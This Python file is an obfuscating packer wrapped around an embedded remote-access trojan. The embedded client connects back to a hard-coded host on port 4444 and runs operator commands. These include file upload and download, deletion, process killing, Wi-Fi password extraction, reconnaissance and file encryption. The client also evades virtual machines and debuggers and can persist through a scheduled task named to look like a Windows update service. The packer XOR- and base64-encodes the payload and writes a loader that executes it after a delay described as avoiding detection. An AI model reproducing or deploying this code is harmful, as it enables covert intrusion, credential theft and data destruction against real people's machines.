import os
import sys
import time
import socket
import ctypes
import subprocess
from cryptography.fernet import Fernet
import platform
import base64
import zlib
import random
import hashlib
from datetime import datetime

# ------------------ Packing Functions ------------------

def _pack_code(code: str) -> bytes:
    """Pack code with multiple layers of obfuscation"""
    # First layer: Compress
    compressed = zlib.compress(code.encode())
    # Second layer: XOR with random key
    key = os.urandom(32)
    xored = bytes(a ^ b for a, b in zip(compressed, key * (len(compressed) // len(key) + 1)))
    # Third layer: Base64 encode
    encoded = base64.b64encode(xored)
    # Fourth layer: Add key to the beginning
    return key + encoded

def _unpack_code(packed: bytes) -> str:
    """Unpack code with multiple layers of deobfuscation"""
    # First layer: Extract key and encoded data
    key = packed[:32]
    encoded = packed[32:]
    # Second layer: Base64 decode
    xored = base64.b64decode(encoded)
    # Third layer: XOR with key
    compressed = bytes(a ^ b for a, b in zip(xored, key * (len(xored) // len(key) + 1)))
    # Fourth layer: Decompress
    return zlib.decompress(compressed).decode()

# ------------------ Original Code (will be packed) ------------------

ORIGINAL_CODE = (
    "import os\n"
    "import sys\n"
    "import time\n"
    "import socket\n"
    "import ctypes\n"
    "import subprocess\n"
    "from cryptography.fernet import Fernet\n"
    "import platform\n"
    "\n"
    "# ------------------ Encryption ------------------\n"
    "\n"
    "key = Fernet.generate_key()\n"
    "cipher = Fernet(key)\n"
    "\n"
    "def encrypt(data: bytes) -> bytes:\n"
    "    return cipher.encrypt(data)\n"
    "\n"
    "def decrypt(data: bytes) -> bytes:\n"
    "    return cipher.decrypt(data)\n"
    "\n"
    "def to_chunks(data: bytes, chunk_size: int = 1024):\n"
    "    return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]\n"
    "\n"
    "# ------------------ Registry Persistence ------------------\n"
    "\n"
    "def create_persistent_task(task_name=\"WinUpdateSvc\"):\n"
    "    exe_path = sys.executable\n"
    "    ps_command = (\n"
    "        f\"$Action = New-ScheduledTaskAction -Execute '{exe_path}'; \"\n"
    "        f\"$Trigger = New-ScheduledTaskTrigger -AtLogOn; \"\n"
    "        f\"$Principal = New-ScheduledTaskPrincipal -UserId \\\"$env:USERNAME\\\" -LogonType Interactive -RunLevel Highest; \"\n"
    "        f\"$Task = New-ScheduledTask -Action $Action -Principal $Principal -Trigger $Trigger; \"\n"
    "        f\"Register-ScheduledTask -TaskName \\\"{task_name}\\\" -InputObject $Task -Force\"\n"
    "    )\n"
    "    try:\n"
    "        result = subprocess.run([\"powershell\", \"-Command\", ps_command],\n"
    "                                capture_output=True, text=True)\n"
    "        if result.returncode == 0:\n"
    "            print(\"Task created successfully.\")\n"
    "        else:\n"
    "            print(\"Failed to create task:\\n\", result.stderr)\n"
    "    except Exception as e:\n"
    "        print(f\"Error running PowerShell: {e}\")\n"
    "\n"
    "def remove_task(task_name=\"WinUpdateSvc\"):\n"
    "    try:\n"
    "        result = subprocess.run(\n"
    "            f'schtasks /delete /tn \"{task_name}\" /f',\n"
    "            shell=True, capture_output=True, text=True)\n"
    "        print(result.stdout)\n"
    "    except Exception as e:\n"
    "        print(f\"Error removing task: {e}\")\n"
    "\n"
    "# ------------------ Anti-Detection ------------------\n"
    "\n"
    "def check_vm():\n"
    "    vm_indicators = [\n"
    "        \"VMware\",\n"
    "        \"VBox\",\n"
    "        \"QEMU\",\n"
    "        \"Xen\"\n"
    "    ]\n"
    "    \n"
    "    try:\n"
    "        vm_count = 0\n"
    "        os_name = platform.system()\n"
    "        \n"
    "        if os_name == \"Windows\":\n"
    "            system_info = subprocess.check_output(\"systeminfo\", shell=True).decode().lower()\n"
    "            for indicator in vm_indicators:\n"
    "                if indicator.lower() in system_info:\n"
    "                    vm_count += 1\n"
    "            \n"
    "            vm_processes = [\"vmtoolsd.exe\", \"vmwaretray.exe\", \"vmwareuser.exe\", \"VBoxService.exe\"]\n"
    "            for proc in vm_processes:\n"
    "                if subprocess.run(f\"tasklist | findstr {proc}\", shell=True).returncode == 0:\n"
    "                    vm_count += 1\n"
    "            \n"
    "            try:\n"
    "                hw_info = subprocess.check_output(\"wmic computersystem get manufacturer,model\", shell=True).decode().lower()\n"
    "                if \"vmware\" in hw_info or \"virtualbox\" in hw_info or \"qemu\" in hw_info:\n"
    "                    vm_count += 2\n"
    "            except:\n"
    "                pass\n"
    "                \n"
    "            try:\n"
    "                services = subprocess.check_output(\"wmic service get name\", shell=True).decode().lower()\n"
    "                if \"vmware\" in services or \"vbox\" in services:\n"
    "                    vm_count += 1\n"
    "            except:\n"
    "                pass\n"
    "                \n"
    "        else:  # Linux\n"
    "            try:\n"
    "                system_info = subprocess.check_output(\"systemd-detect-virt\", shell=True).decode().lower()\n"
    "                if system_info.strip() != \"none\":\n"
    "                    vm_count += 2\n"
    "            except:\n"
    "                pass\n"
    "                \n"
    "            vm_processes = [\"vmtoolsd\", \"vmware-toolbox\", \"VBoxService\"]\n"
    "            for proc in vm_processes:\n"
    "                if subprocess.run(f\"ps aux | grep {proc}\", shell=True).returncode == 0:\n"
    "                    vm_count += 1\n"
    "            \n"
    "            try:\n"
    "                hw_info = subprocess.check_output(\"lscpu\", shell=True).decode().lower()\n"
    "                if \"vmware\" in hw_info or \"virtualbox\" in hw_info or \"qemu\" in hw_info:\n"
    "                    vm_count += 2\n"
    "            except:\n"
    "                pass\n"
    "                \n"
    "            try:\n"
    "                modules = subprocess.check_output(\"lsmod\", shell=True).decode().lower()\n"
    "                if \"vmware\" in modules or \"vbox\" in modules:\n"
    "                    vm_count += 1\n"
    "            except:\n"
    "                pass\n"
    "                \n"
    "            try:\n"
    "                devices = subprocess.check_output(\"lspci\", shell=True).decode().lower()\n"
    "                if \"vmware\" in devices or \"virtualbox\" in devices:\n"
    "                    vm_count += 1\n"
    "            except:\n"
    "                pass\n"
    "        \n"
    "        return vm_count >= 3\n"
    "                \n"
    "    except:\n"
    "        return False\n"
    "\n"
    "def check_debugger():\n"
    "    try:\n"
    "        os_name = platform.system()\n"
    "        debug_count = 0\n"
    "        \n"
    "        if os_name == \"Windows\":\n"
    "            if ctypes.windll.kernel32.IsDebuggerPresent() != 0:\n"
    "                debug_count += 2\n"
    "            \n"
    "            debugger_processes = [\n"
    "                \"x64dbg.exe\", \"x32dbg.exe\", \"ollydbg.exe\", \"ida.exe\", \"ida64.exe\",\n"
    "                \"windbg.exe\", \"immunitydebugger.exe\", \"radare2.exe\", \"ghidra.exe\"\n"
    "            ]\n"
    "            for proc in debugger_processes:\n"
    "                if subprocess.run(f\"tasklist | findstr {proc}\", shell=True).returncode == 0:\n"
    "                    debug_count += 1\n"
    "            \n"
    "            try:\n"
    "                netstat = subprocess.check_output(\"netstat -an\", shell=True).decode().lower()\n"
    "                debug_ports = [\"23946\", \"23947\", \"23948\", \"23949\"]\n"
    "                for port in debug_ports:\n"
    "                    if port in netstat:\n"
    "                        debug_count += 1\n"
    "            except:\n"
    "                pass\n"
    "                \n"
    "            try:\n"
    "                reg_keys = [\n"
    "                    r\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug\",\n"
    "                    r\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\"\n"
    "                ]\n"
    "                for key in reg_keys:\n"
    "                    result = subprocess.run(f'reg query \"{key}\"', shell=True, capture_output=True)\n"
    "                    if result.returncode == 0:\n"
    "                        debug_count += 1\n"
    "            except:\n"
    "                pass\n"
    "                \n"
    "        else:  # Linux\n"
    "            debugger_processes = [\n"
    "                \"gdb\", \"lldb\", \"radare2\", \"ida\", \"ghidra\", \"strace\", \"ltrace\"\n"
    "            ]\n"
    "            for proc in debugger_processes:\n"
    "                if subprocess.run(f\"ps aux | grep {proc}\", shell=True).returncode == 0:\n"
    "                    debug_count += 1\n"
    "            \n"
    "            try:\n"
    "                env_vars = os.environ\n"
    "                debug_vars = [\"LD_PRELOAD\", \"LD_LIBRARY_PATH\", \"LD_DEBUG\"]\n"
    "                for var in debug_vars:\n"
    "                    if var in env_vars:\n"
    "                        debug_count += 1\n"
    "            except:\n"
    "                pass\n"
    "            \n"
    "            try:\n"
    "                netstat = subprocess.check_output(\"netstat -tuln\", shell=True).decode().lower()\n"
    "                debug_ports = [\"23946\", \"23947\", \"23948\", \"23949\"]\n"
    "                for port in debug_ports:\n"
    "                    if port in netstat:\n"
    "                        debug_count += 1\n"
    "            except:\n"
    "                pass\n"
    "            \n"
    "            try:\n"
    "                debug_files = [\n"
    "                    \"/proc/self/status\",\n"
    "                    \"/proc/self/fd/0\",\n"
    "                    \"/proc/self/cmdline\"\n"
    "                ]\n"
    "                for file in debug_files:\n"
    "                    if os.path.exists(file):\n"
    "                        with open(file, 'r') as f:\n"
    "                            content = f.read().lower()\n"
    "                            if \"tracerpid\" in content and \"0\" not in content:\n"
    "                                debug_count += 2\n"
    "                            if \"pipe\" in content:\n"
    "                                debug_count += 1\n"
    "                            if any(debugger in content for debugger in debugger_processes):\n"
    "                                debug_count += 1\n"
    "            except:\n"
    "                pass\n"
    "        \n"
    "        return debug_count >= 3\n"
    "                \n"
    "    except:\n"
    "        return False\n"
    "\n"
    "# ------------------ Wallpaper Control ------------------\n"
    "\n"
    "def change_wallpaper(image_path: str) -> bytes:\n"
    "    if not os.path.exists(image_path):\n"
    "        return encrypt(b\"Image not found\")\n"
    "    \n"
    "    SPI_SETDESKWALLPAPER = 20\n"
    "    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 0)\n"
    "    return encrypt(b\"Wallpaper changed\")\n"
    "\n"
    "def predict_operating_system():\n"
    "    os_name=platform.system()\n"
    "    return os_name\n"
    "\n"
    "# ------------------ Client Handler ------------------\n"
    "\n"
    "class ClientHandler:\n"
    "    def __init__(self, connection: socket.socket):\n"
    "        self.connection = connection\n"
    "\n"
    "    def send(self, data: bytes):\n"
    "        self.connection.sendall(data)\n"
    "\n"
    "    def recv(self, size: int = 1024) -> bytes:\n"
    "        return self.connection.recv(size)\n"
    "    \n"
    "    def download(self,filename):\n"
    "        file_size = int(decrypt(self.recv(1024)).decode())\n"
    "        block_size = 1024\n"
    "        num_blocks = file_size // block_size\n"
    "        remaining_bytes = file_size % block_size\n"
    "        with open(f'{filename}','wb') as file:\n"
    "            chunk_number = 1\n"
    "            for i in range(num_blocks):    \n"
    "                data = self.connection.recv(1024)\n"
    "                file.write(data)\n"
    "                chunk_number += 1\n"
    "            data = self.connection.recv(remaining_bytes)\n"
    "            file.write(data)\n"
    "            file.close()\n"
    "        \n"
    "    def upload(self,filename):\n"
    "        current_path =  os.path.abspath(os.getcwd())\n"
    "        file_path = os.path.join(current_path,filename)\n"
    "        file_size_upload = str(os.path.getsize(file_path))\n"
    "        self.send(encrypt(file_size_upload.encode()))\n"
    "        time.sleep(0.2)\n"
    "        block_size = 1024\n"
    "        num_blocks = int(file_size_upload) // block_size\n"
    "        remaining_bytes = int(file_size_upload) % block_size\n"
    "        with open(filename, 'rb') as file:\n"
    "            chunk_number = 1\n"
    "            for i in range(num_blocks):\n"
    "                data_chunk = file.read(1024)\n"
    "                self.send(data_chunk)\n"
    "                chunk_number += 1\n"
    "                time.sleep(0.05)\n"
    "            data_chunk = file.read(remaining_bytes)\n"
    "            self.send(data_chunk)\n"
    "            file.close()\n"
    "\n"
    "    def encrypt_file(self , filename):\n"
    "        current_path =  os.path.abspath(os.getcwd())\n"
    "        file_path = os.path.join(current_path,filename)\n"
    "        try:\n"
    "            with open(file_path,\"rb\") as file:\n"
    "                data = file.read()\n"
    "            file.close()\n"
    "            data = encrypt(data)\n"
    "            with open(file_path,\"wb\") as file:\n"
    "                file.write(data)\n"
    "            file.close()\n"
    "            self.send(encrypt(b\"File encrypted successfully\"))\n"
    "        except Exception as e:\n"
    "            self.send(encrypt(f\"Error encrypting file: {e}\".encode()))\n"
    "    \n"
    "    def decrypt_file(self , filename):\n"
    "        current_path =  os.path.abspath(os.getcwd())\n"
    "        file_path = os.path.join(current_path,filename)\n"
    "        try:\n"
    "            with open(file_path,\"rb\") as file:\n"
    "                data = file.read()\n"
    "            file.close()\n"
    "            data = decrypt(data)\n"
    "            with open(file_path,\"wb\") as file:\n"
    "                file.write(data)\n"
    "            file.close()\n"
    "            self.send(encrypt(b\"File decrypted successfully\"))\n"
    "        except Exception as e:\n"
    "            self.send(encrypt(f\"Error decrypting file: {e}\".encode()))\n"
    "                \n"
    "\n"
    "    def authenticate(self, valid_user=\"test\", valid_pass=\"test\") -> bool:\n"
    "        logged_in = False\n"
    "        counter = 0\n"
    "        while not logged_in:\n"
    "            self.send(encrypt(b\"Username: \"))\n"
    "            username = decrypt(self.recv()).decode().strip()\n"
    "            self.send(encrypt(b\"Password: \"))\n"
    "            password = decrypt(self.recv()).decode().strip()\n"
    "\n"
    "            if username == valid_user and password == valid_pass:\n"
    "                self.send(encrypt(b\"Authentication successful\"))\n"
    "                logged_in = True\n"
    "                return True\n"
    "            elif counter <2:\n"
    "                counter += 1\n"
    "                self.send(encrypt(f\"Wrong credentials ,you have {3-counter} more tries\".encode()))\n"
    "            else:\n"
    "                self.send(encrypt(b\"Authentication failed\"))\n"
    "                return False\n"
    "\n"
    "    def send_data(self, data: bytes):\n"
    "        encrypted = encrypt(data)\n"
    "        chunks = to_chunks(encrypted)\n"
    "        self.send(encrypt(str(len(chunks)).encode()))\n"
    "        time.sleep(1)\n"
    "        for chunk in chunks:\n"
    "            self.send(chunk)\n"
    "            time.sleep(0.1)\n"
    "\n"
    "\n"
    "    def handle_commands(self,os_name):\n"
    "        while True:\n"
    "            try:\n"
    "                cmd = decrypt(self.recv()).decode()\n"
    "                print(f\"[Received] {cmd}\")\n"
    "                if cmd == \"close\":\n"
    "                    self.connection.close()\n"
    "                    sys.exit()\n"
    "\n"
    "                elif cmd == \"dir\":\n"
    "                    if os_name==\"Windows\":\n"
    "                        result = subprocess.run(\"dir\", shell=True, capture_output=True, text=True).stdout\n"
    "                    else:\n"
    "                        result = subprocess.run(\"ls -ltrh\", shell=True, capture_output=True, text=True).stdout\n"
    "                    self.send_data(result.encode())\n"
    "\n"
    "                elif cmd == \"path\":\n"
    "                    if os_name==\"Windows\":\n"
    "                        current = os.path.abspath(os.getcwd())\n"
    "                        self.send_data(current.encode())\n"
    "                    else:\n"
    "                        result = subprocess.run(\"pwd\", shell=True, capture_output=True, text=True).stdout\n"
    "                        self.send_data(result.encode())\n"
    "\n"
    "                elif cmd == \"ipconfig\":\n"
    "                    if os_name==\"Windows\":\n"
    "                        result = subprocess.run(\"ipconfig\", shell=True, capture_output=True, text=True).stdout\n"
    "                    else:\n"
    "                        result = subprocess.run(\"ip a\", shell=True, capture_output=True, text=True).stdout\n"
    "                    self.send_data(result.encode())\n"
    "\n"
    "                elif cmd == \"arp -a\":\n"
    "                    result = subprocess.run(\"arp -a\", shell=True, capture_output=True, text=True).stdout\n"
    "                    self.send_data(result.encode())\n"
    "                \n"
    "                elif cmd == \"wifi-networks\":\n"
    "                    if os_name==\"Windows\":\n"
    "                        result = subprocess.run(\"netsh wlan show profile\", shell=True, capture_output=True, text=True).stdout\n"
    "                    else:\n"
    "                        result = \"Still unavailable on linux\"\n"
    "                    self.send_data(result.encode())\n"
    "                \n"
    "                elif cmd == \"hostname\":\n"
    "                    if os_name==\"Windows\":\n"
    "                        result = subprocess.run(\"systeminfo\", shell=True, capture_output=True, text=True).stdout\n"
    "                    else:\n"
    "                        result = subprocess.run(\"hostnamectl\", shell=True, capture_output=True, text=True).stdout\n"
    "                    self.send_data(result.encode())\n"
    "                \n"
    "                elif cmd == \"ps\":\n"
    "                    if os_name==\"Windows\":\n"
    "                        result = subprocess.run(\"tasklist /v\", shell=True, capture_output=True, text=True).stdout\n"
    "                    else:\n"
    "                        result = subprocess.run(\"ps aux\", shell=True, capture_output=True, text=True).stdout\n"
    "                    self.send_data(result.encode())\n"
    "                \n"
    "                elif cmd.startswith(\"kill \"):\n"
    "                    try:\n"
    "                        target = cmd.split(\" \", 1)[1]\n"
    "                        if os_name==\"Windows\":\n"
    "                            try:\n"
    "                                pid = int(target)\n"
    "                                result = subprocess.run(f\"taskkill /F /PID {pid}\", shell=True, capture_output=True, text=True)\n"
    "                            except ValueError:\n"
    "                                result = subprocess.run(f\"taskkill /F /IM {target}\", shell=True, capture_output=True, text=True)\n"
    "                        else:\n"
    "                            try:\n"
    "                                pid = int(target)\n"
    "                                result = subprocess.run(f\"kill -9 {pid}\", shell=True, capture_output=True, text=True)\n"
    "                            except ValueError:\n"
    "                                result = subprocess.run(f\"pkill -9 {target}\", shell=True, capture_output=True, text=True)\n"
    "                        \n"
    "                        if result.returncode == 0:\n"
    "                            self.send(encrypt(b\"1\"))\n"
    "                            self.send(encrypt(f\"Successfully killed process: {target}\".encode()))\n"
    "                        else:\n"
    "                            self.send(encrypt(b\"1\"))\n"
    "                            self.send(encrypt(f\"Failed to kill process: {target}\\nError: {result.stderr}\".encode()))\n"
    "                    except Exception as e:\n"
    "                        self.send(encrypt(b\"1\"))\n"
    "                        self.send(encrypt(f\"Error killing process: {str(e)}\".encode()))\n"
    "                \n"
    "                elif cmd == \"system\":\n"
    "                    try:\n"
    "                        if os_name==\"Windows\":\n"
    "                            cpu_cmd = 'wmic cpu get loadpercentage'\n"
    "                            mem_cmd = 'wmic OS get FreePhysicalMemory,TotalVisibleMemorySize /Value'\n"
    "                            \n"
    "                            cpu_result = subprocess.run(cpu_cmd, shell=True, capture_output=True, text=True)\n"
    "                            mem_result = subprocess.run(mem_cmd, shell=True, capture_output=True, text=True)\n"
    "                            \n"
    "                            cpu_lines = cpu_result.stdout.strip().split('\\n')\n"
    "                            mem_lines = mem_result.stdout.strip().split('\\n')\n"
    "                            \n"
    "                            cpu_usage = cpu_lines[2].strip() if len(cpu_lines) > 1 else \"0\"\n"
    "                            if not cpu_usage.isdigit():\n"
    "                                cpu_usage = \"0\"\n"
    "                            \n"
    "                            total_mem = 0\n"
    "                            free_mem = 0\n"
    "                            for line in mem_lines:\n"
    "                                if \"TotalVisibleMemorySize\" in line:\n"
    "                                    total_mem = int(line.split('=')[1].strip())\n"
    "                                elif \"FreePhysicalMemory\" in line:\n"
    "                                    free_mem = int(line.split('=')[1].strip())\n"
    "                            \n"
    "                            used_mem = total_mem - free_mem\n"
    "                            mem_percent = (used_mem / total_mem * 100) if total_mem > 0 else 0\n"
    "                            \n"
    "                            output = \"System Resource Usage:\\n\"\n"
    "                            output += f\"CPU Usage: {cpu_usage}%\\n\"\n"
    "                            output += f\"Memory Usage: {mem_percent:.1f}%\\n\"\n"
    "                            output += f\"Total Memory: {total_mem/1024/1024:.1f} GB\\n\"\n"
    "                            output += f\"Used Memory: {used_mem/1024/1024:.1f} GB\\n\"\n"
    "                            output += f\"Free Memory: {free_mem/1024/1024:.1f} GB\"\n"
    "                        else:\n"
    "                            cpu_cmd = \"top -bn1 | grep 'Cpu(s)' | awk '{print $2}'\"\n"
    "                            mem_cmd = \"free -m | grep Mem\"\n"
    "                            \n"
    "                            cpu_result = subprocess.run(cpu_cmd, shell=True, capture_output=True, text=True)\n"
    "                            mem_result = subprocess.run(mem_cmd, shell=True, capture_output=True, text=True)\n"
    "                            \n"
    "                            cpu_usage = cpu_result.stdout.strip() or \"0\"\n"
    "                            mem_values = mem_result.stdout.split()\n"
    "                            \n"
    "                            if len(mem_values) >= 7:\n"
    "                                total_mem = int(mem_values[1])\n"
    "                                used_mem = int(mem_values[2])\n"
    "                                free_mem = int(mem_values[3])\n"
    "                                mem_percent = (used_mem / total_mem * 100) if total_mem > 0 else 0\n"
    "                                \n"
    "                                output = \"System Resource Usage:\\n\"\n"
    "                                output += f\"CPU Usage: {cpu_usage}%\\n\"\n"
    "                                output += f\"Memory Usage: {mem_percent:.1f}%\\n\"\n"
    "                                output += f\"Total Memory: {total_mem/1024:.1f} GB\\n\"\n"
    "                                output += f\"Used Memory: {used_mem/1024:.1f} GB\\n\"\n"
    "                                output += f\"Free Memory: {free_mem/1024:.1f} GB\"\n"
    "                            else:\n"
    "                                output = \"Failed to get memory information\"\n"
    "                        \n"
    "                        self.send(encrypt(b\"1\"))\n"
    "                        self.send(encrypt(output.encode()))\n"
    "                    except Exception as e:\n"
    "                        self.send(encrypt(b\"1\"))\n"
    "                        self.send(encrypt(f\"Error getting system info: {str(e)}\".encode()))\n"
    "                \n"
    "                elif cmd.startswith(\"wifi-password \"):\n"
    "                    wifi_network = cmd.split(\" \",1)[1]\n"
    "                    command = f'netsh wlan show profile \"{wifi_network}\" key=clear'\n"
    "                    if os_name==\"Windows\":\n"
    "                        result = subprocess.run(command, shell=True, capture_output=True, text=True).stdout\n"
    "                    else:\n"
    "                        command = f\"sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | grep -i '{wifi_network}'\"\n"
    "                        try:\n"
    "                            result = subprocess.run(command, shell=True, capture_output=True, text=True).stdout\n"
    "                            if not result:\n"
    "                                result = f\"No password found for network: {wifi_network}\"\n"
    "                        except:\n"
    "                            result = \"Failed to retrieve WiFi password. May need sudo privileges.\"\n"
    "                    self.send_data(result.encode())                    \n"
    "\n"
    "                elif cmd.startswith(\"del \"):\n"
    "                    filename = cmd.split(\" \", 1)[1]\n"
    "                    try:\n"
    "                        os.remove(os.path.join(os.getcwd(), filename))\n"
    "                        self.send(encrypt(b\"File deleted\"))\n"
    "                    except:\n"
    "                        self.send(encrypt(b\"Deletion failed\"))\n"
    "\n"
    "                elif cmd.startswith(\"cd \"):\n"
    "                    directory = cmd.split(\" \", 1)[1]\n"
    "                    try:\n"
    "                        os.chdir(directory)\n"
    "                        current = os.path.abspath(os.getcwd())\n"
    "                        self.send(encrypt(b\"1\"))\n"
    "                        time.sleep(0.5)\n"
    "                        self.send(encrypt(f\"Changed to {current}\".encode()))\n"
    "                    except:\n"
    "                        self.send(encrypt(b\"Directory change failed\"))\n"
    "\n"
    "                elif cmd.startswith(\"download \"):\n"
    "                    file_name = decrypt(self.recv()).decode()\n"
    "                    self.upload(file_name)\n"
    "\n"
    "\n"
    "                elif cmd.startswith(\"upload \"):\n"
    "                    file_name = decrypt(self.recv()).decode()\n"
    "                    self.download(file_name)\n"
    "\n"
    "                elif cmd.startswith(\"wall \"):\n"
    "                    if os_name==\"Windows\":\n"
    "                        filename = cmd.split(\" \", 1)[1]\n"
    "                        result = change_wallpaper(os.path.join(os.getcwd(), filename))\n"
    "                        self.send(encrypt(b\"1\"))\n"
    "                        self.send(result)\n"
    "                    else:\n"
    "                        try:\n"
    "                            filename = cmd.split(\" \", 1)[1]\n"
    "                            filepath = os.path.join(os.getcwd(), filename)\n"
    "                            command = f\"gsettings set org.gnome.desktop.background picture-uri file://{filepath}\"\n"
    "                            result = subprocess.run(command, shell=True, capture_output=True, text=True)\n"
    "                            if result.returncode == 0:\n"
    "                                self.send(encrypt(b\"1\"))\n"
    "                                self.send(encrypt(b\"Wallpaper changed successfully\"))\n"
    "                            else:\n"
    "                                self.send(encrypt(b\"1\")) \n"
    "                                self.send(encrypt(b\"Failed to change wallpaper - command failed\"))\n"
    "                        except Exception as e:\n"
    "                            self.send(encrypt(b\"1\"))\n"
    "                            self.send(encrypt(f\"Failed to change wallpaper: {str(e)}\".encode()))\n"
    "                \n"
    "                elif cmd.startswith(\"encrypt \"):\n"
    "                    file_name = decrypt(self.recv()).decode()\n"
    "                    self.encrypt_file(file_name)        \n"
    "\n"
    "                elif cmd.startswith(\"decrypt \"):\n"
    "                    file_name = decrypt(self.recv()).decode()\n"
    "                    self.decrypt_file(file_name)          \n"
    "\n"
    "                else:\n"
    "                    self.send(encrypt(b\"1\"))\n"
    "                    self.send(encrypt(b\"Unknown command\"))\n"
    "\n"
    "            except Exception as e:\n"
    "                self.send(encrypt(f\"Error: {e}\".encode()))\n"
    "                print(f\"[Error] {e}\")\n"
    "                break\n"
    "\n"
    "# ------------------ Main Server ------------------\n"
    "\n"
    "def Connect_to_server():\n"
    "    if not (check_debugger() or check_vm()):\n"
    "        print(\" No Debugger or VM detected.\")\n"
    "        operating_system = predict_operating_system()\n"
    "        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n"
    "            while 1:\n"
    "                try:\n"
    "                    sock.connect((\"192.168.50.200\",4444))\n"
    "                    print(\"[*] Connected to server ...    \")\n"
    "                    time.sleep(1)\n"
    "                    sock.sendall(key)\n"
    "                    time.sleep(1)\n"
    "                    sock.sendall(operating_system.encode())\n"
    "                    client = ClientHandler(sock)\n"
    "                    if client.authenticate():\n"
    "                        client.handle_commands(operating_system)\n"
    "                    else:\n"
    "                        print(\"Authentication Error\")\n"
    "                    client.connection.close()\n"
    "                    return\n"
    "                except Exception:\n"
    "                    timer = 20\n"
    "                    print(\"Server is not up yet. Trying again in\")\n"
    "                    for i in range(timer,0,-1):\n"
    "                        print(f\"{i} seconds \", end=\"\\r\",flush=True)\n"
    "                        time.sleep(1)\n"
    "    else:\n"
    "        print(\"Debugger or VM detected. Exiting...\")\n"
    "        sys.exit()\n"
    "\n"
    "if __name__ == \"__main__\":\n"
    "    #create_persistent_task()\n"
    "    #remove_task()\n"
    "    Connect_to_server()\n"
)

# ------------------ Pack the Code ------------------

def _generate_loader():
    """Generate a loader that will unpack and execute the packed code"""
    loader_code = f'''
import os
import sys
import base64
import zlib
import random

def _unpack():
    packed = {_pack_code(ORIGINAL_CODE)}
    key = packed[:32]
    encoded = packed[32:]
    xored = base64.b64decode(encoded)
    compressed = bytes(a ^ b for a, b in zip(xored, key * (len(xored) // len(key) + 1)))
    return zlib.decompress(compressed).decode()

if __name__ == "__main__":
    try:
        # Add random delay to avoid detection
        time.sleep(random.uniform(1, 3))
        # Unpack and execute the code
        exec(_unpack())
    except Exception as e:
        sys.exit()
'''
    return loader_code

# ------------------ Main ------------------

if __name__ == "__main__":
    # Generate the packed version
    packed_code = _generate_loader()
    
    # Write the packed code to a file
    with open("packed_client.py", "w") as f:
        f.write(packed_code)
    
    print("Code has been packed and saved to packed_client.py") 